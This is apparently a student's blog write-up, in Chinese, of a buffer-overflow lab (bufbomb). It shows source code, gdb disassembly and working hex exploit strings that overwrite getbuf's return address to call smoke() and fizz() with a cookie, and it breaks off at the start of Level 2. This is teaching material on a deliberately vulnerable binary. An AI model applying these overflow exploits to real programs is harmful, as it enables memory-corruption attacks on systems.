<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>buflab-计算机系统实验 | Code Play</title><meta name="keywords" content="湖南大学"><meta name="author" content="南懿烨曦,869083577@qq.com"><meta name="copyright" content="南懿烨曦"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0. 查看cookie 123lkl@lkl-virtual-machine:~&#x2F;桌面&#x2F;计算机系统&#x2F;buflab-handout$ .&#x2F;makecookie 2020260105210x685c1d96    1.Level0: Candle (10 pts)Your task is to get BUFBOMB to execute the code forsmoke when getbuf e">
<meta property="og:type" content="article">
<meta property="og:title" content="buflab-计算机系统实验">
<meta property="og:url" content="https://kallenblue.github.io/2022/09/08/buflab-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/index.html">
<meta property="og:site_name" content="Code Play">
<meta property="og:description" content="0. 查看cookie 123lkl@lkl-virtual-machine:~&#x2F;桌面&#x2F;计算机系统&#x2F;buflab-handout$ .&#x2F;makecookie 2020260105210x685c1d96    1.Level0: Candle (10 pts)Your task is to get BUFBOMB to execute the code forsmoke when getbuf e">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/e16e9047-7a60-48d9-91d5-f47d08752dd8.jpeg">
<meta property="article:published_time" content="2022-09-08T15:12:26.000Z">
<meta property="article:modified_time" content="2022-09-13T01:58:36.036Z">
<meta property="article:author" content="南懿烨曦">
<meta property="article:tag" content="湖南大学">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/e16e9047-7a60-48d9-91d5-f47d08752dd8.jpeg"><link rel="shortcut icon" href="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/3c412e9d-72fd-461f-89ea-b46d7303b054.png"><link rel="canonical" href="https://kallenblue.github.io/2022/09/08/buflab-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: 南懿烨曦","link":"链接: ","source":"来源: Code Play","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'mediumZoom',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'buflab-计算机系统实验',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-09-13 09:58:36'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="Code Play" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/79aa9224-5aab-479d-86a1-de377b1b3f41.jpg" data-lazy-src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/56de10fa-7fcf-450c-b8bb-cf46d0633c3f.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/e16e9047-7a60-48d9-91d5-f47d08752dd8.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Code Play</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">buflab-计算机系统实验</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-08T15:12:26.000Z" title="发表于 2022-09-08 23:12:26">2022-09-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-09-13T01:58:36.036Z" title="更新于 2022-09-13 09:58:36">2022-09-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/">课程作业</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="buflab-计算机系统实验"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0-查看cookie"><a href="#0-查看cookie" class="headerlink" title="0. 查看cookie"></a><strong>0. 查看cookie</strong></h1> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./makecookie 202026010521</span><br><span class="line">0x685c1d96</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="1-Level0-Candle-10-pts"><a href="#1-Level0-Candle-10-pts" class="headerlink" title="1.Level0: Candle (10 pts)"></a><strong>1.Level0: Candle (10 pts)</strong></h1><p>Your task is to get BUFBOMB to execute the code forsmoke when getbuf executes its return statement,rather than returning to test.Note that your exploit string may also corrupt parts of the stack notdirectlyrelated to this stage, but this will not cause a problem, since smokecauses the program to exit directly.</p>
<p>题意解析：这里就是要让test运行完后，不直接返回退出。而是跳到smoke函数处，继续运行，而当smoke运行完毕后，才退出。</p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="comment">/* Put canary on stack to detect possiblecorruption */</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = uniqueval();</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="comment">/* Check for corruption stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != uniqueval())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has beencorrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned0x%x\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Smoke源码：</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">smoke</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Smoke!: You calledsmoke()&quot;</span>);</span><br><span class="line">    validate(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><img src= "https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/79aa9224-5aab-479d-86a1-de377b1b3f41.jpg" data-lazy-src="https://img-blog.csdnimg.cn/31da264d8cc84f249b4ac64a317d7aa5.png#pic_center" alt="在这里插入图片描述"></p>
<p>Gets()函数用来获取数据到缓冲区，而Gets()函数不会对输入的数据进行边界检查。所以当我们的输入超过了缓冲区的大小（这里是32）时，超过缓冲区的数据就会覆盖内存中用作其它用途的数据，从而改变程序的行为。</p>
<p>要运行smoke()函数，只需要将buf区的内容冲到返回地址即可，这样原本应该返回到test()函数的地址被修改为了smoke()函数的地址</p>
<p>查看getbuf()汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ gdb -q bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x08049262 &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x08049263 &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08049265 &lt;+3&gt;:	sub    $0x38,%esp</span><br><span class="line">   0x08049268 &lt;+6&gt;:	lea    -0x28(%ebp),%eax</span><br><span class="line">   0x0804926b &lt;+9&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x0804926e &lt;+12&gt;:	call   0x8048c32 &lt;Gets&gt;</span><br><span class="line">   0x08049273 &lt;+17&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x08049278 &lt;+22&gt;:	leave  </span><br><span class="line">   0x08049279 &lt;+23&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>发现buf缓冲区大小为0x28，加上ebp所指空间，则到达返回地址空间，故答案中的前44个字节可以任意填写（由于Gets是通过换行符\n（ASCII值0x0a）界定输入终止的，所以前44字节只要不是0a就可以），最后四个字节填写smoke()函数的地址</p>
<p>查看smoke()函数的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble smoke </span><br><span class="line">Dump of assembler code for function smoke:</span><br><span class="line">   0x08048e0a &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x08048e0b &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08048e0d &lt;+3&gt;:	sub    $0x18,%esp</span><br><span class="line">   0x08048e10 &lt;+6&gt;:	movl   $0x804a2fe,0x4(%esp)</span><br><span class="line">   0x08048e18 &lt;+14&gt;:	movl   $0x1,(%esp)</span><br><span class="line">   0x08048e1f &lt;+21&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048e24 &lt;+26&gt;:	movl   $0x0,(%esp)</span><br><span class="line">   0x08048e2b &lt;+33&gt;:	call   0x8049280 &lt;validate&gt;</span><br><span class="line">   0x08048e30 &lt;+38&gt;:	movl   $0x0,(%esp)</span><br><span class="line">   0x08048e37 &lt;+45&gt;:	call   0x80488d0 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>地址为0x08048e0a,可以看到地址中有0a，查阅资料可知0a对应的ASCII码为换行符，写入会出错。可以看到smoke()最后有调用一个exit()函数，即直接退出程序，不再返回到原函数，所以smoke()函数的第一条汇编码可以忽略(此汇编码表示存储test()函数栈底esp的地址)，所以我们选择0x08048e0b</p>
<h5 id="答案及结果"><a href="#答案及结果" class="headerlink" title="答案及结果"></a>答案及结果</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">./0.txt</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13</span><br><span class="line">0b 8e 04 08</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw &lt; 0.txt | ./bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:Smoke!: You called smoke()</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="2-Level1-Sparkler-10-pts"><a href="#2-Level1-Sparkler-10-pts" class="headerlink" title="2.Level1: Sparkler (10 pts)"></a>2.Level1: Sparkler (10 pts)</h1><p>Similar to Level 0, your task isto get BUFBOMB to execute the code for fizz rather than returningto test. In this case, however, you must make it appear to fizz as if you havepassed your cookie as its argument. How can you do this?</p>
<p>题意解析：</p>
<p>在level 0的基础上，使getbuf函数的返回指向fizz函数，同时将fizz函数的参数置为userid对应的cookie值。</p>
<h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>fizz()函数源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fizz</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You calledfizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You calledfizz(0x%x)\n&quot;</span>, val);</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/79aa9224-5aab-479d-86a1-de377b1b3f41.jpg" data-lazy-src="https://img-blog.csdnimg.cn/31da264d8cc84f249b4ac64a317d7aa5.png#pic_center" alt="在这里插入图片描述"></p>
<p>查看fizz()函数的汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble fizz </span><br><span class="line">Dump of assembler code for function fizz:</span><br><span class="line">   0x08048daf &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x08048db0 &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08048db2 &lt;+3&gt;:	sub    $0x18,%esp</span><br><span class="line">   0x08048db5 &lt;+6&gt;:	mov    0x8(%ebp),%eax</span><br><span class="line">   0x08048db8 &lt;+9&gt;:	cmp    0x804d104,%eax</span><br><span class="line">   0x08048dbe &lt;+15&gt;:	jne    0x8048de6 &lt;fizz+55&gt;</span><br><span class="line">   0x08048dc0 &lt;+17&gt;:	mov    %eax,0x8(%esp)</span><br><span class="line">   0x08048dc4 &lt;+21&gt;:	movl   $0x804a2e0,0x4(%esp)</span><br><span class="line">   0x08048dcc &lt;+29&gt;:	movl   $0x1,(%esp)</span><br><span class="line">   0x08048dd3 &lt;+36&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048dd8 &lt;+41&gt;:	movl   $0x1,(%esp)</span><br><span class="line">   0x08048ddf &lt;+48&gt;:	call   0x8049280 &lt;validate&gt;</span><br><span class="line">   0x08048de4 &lt;+53&gt;:	jmp    0x8048dfe &lt;fizz+79&gt;</span><br><span class="line">   0x08048de6 &lt;+55&gt;:	mov    %eax,0x8(%esp)</span><br><span class="line">   0x08048dea &lt;+59&gt;:	movl   $0x804a4d4,0x4(%esp)</span><br><span class="line">   0x08048df2 &lt;+67&gt;:	movl   $0x1,(%esp)</span><br><span class="line">   0x08048df9 &lt;+74&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048dfe &lt;+79&gt;:	movl   $0x0,(%esp)</span><br><span class="line">   0x08048e05 &lt;+86&gt;:	call   0x80488d0 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08048dc0 &lt;+17&gt;:	mov    %eax,0x8(%esp)</span><br></pre></td></tr></table></figure>

<p>这一步就是在取参数，正好取的就是第二个参数区的位置</p>
<p>在getbuf()的返回地址中存入fizz()函数的地址,返回地址上面的那个函数参数区存fizz()函数的返回地址，但由于fizz()函数根本不会返回，所以可以随意存，最上面的函数参数区存要传入的cookie参数</p>
<p>答案及结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./1.txt</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13</span><br><span class="line">af 8d 04 08 //fizz()函数的地址</span><br><span class="line">11 11 11 11	//fizz()函数的返回地址</span><br><span class="line">96 1d 5c 68 //cookie参数</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw &lt; 1.txt | ./bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:Fizz!: You called fizz(0x685c1d96)</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="3-Level2-Firecracker-15-pts"><a href="#3-Level2-Firecracker-15-pts" class="headerlink" title="3.Level2: Firecracker (15 pts)"></a>3.Level2: Firecracker (15 pts)</h1><p>Similar to Levels0 and 1, your task is to get BUFBOMB to execute the code for bang rather than returningto test. Before this, however, you must set global variable global_value toyour userid’s cookie. Your exploit code should set global_value, push theaddress of bang on the stack, and then execute a ret instruction to cause ajump to the code for bang.</p>
<p>题意解析：</p>
<p>令getbuf调用后不执行test函数，而是执行bang函数（默认会执行test函数），但是同时我们要修改global_value的值为cookie值。然而，global_value是一个全局变量，它没有储存再栈里面。所以在程序执行过程中，只能通过赋值语句来改变global_value的值。即这次我们不仅要让函数跳到bang中，而且要模拟一个函数调用来进行赋值。</p>
<h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>bang()函数源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> global_value =<span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bang</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (global_value ==cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Bang!:You set global_value to 0x%x\n&quot;</span>, global_value);</span><br><span class="line">validate(<span class="number">2</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire:global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src= "https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/79aa9224-5aab-479d-86a1-de377b1b3f41.jpg" data-lazy-src="https://img-blog.csdnimg.cn/31da264d8cc84f249b4ac64a317d7aa5.png#pic_center" alt="在这里插入图片描述"></p>
<p>先假设我们已经有段攻击代码可以更改global_value的值，我们应该把这段攻击代码放在哪里？</p>
<p>答案是buf缓冲区，这里有很大一部分空间可以用来存放我们的攻击代码，返回地址存buf缓冲区的首地址，这样getbuf() return的时候会跑到buf缓冲区里面去，我们只需要将攻击代码加上一个返回指令，让代码执行结束后返回到bang()函数的位置，让程序继续运行bang()函数就ok</p>
<p>攻击代码需要实现的功能：</p>
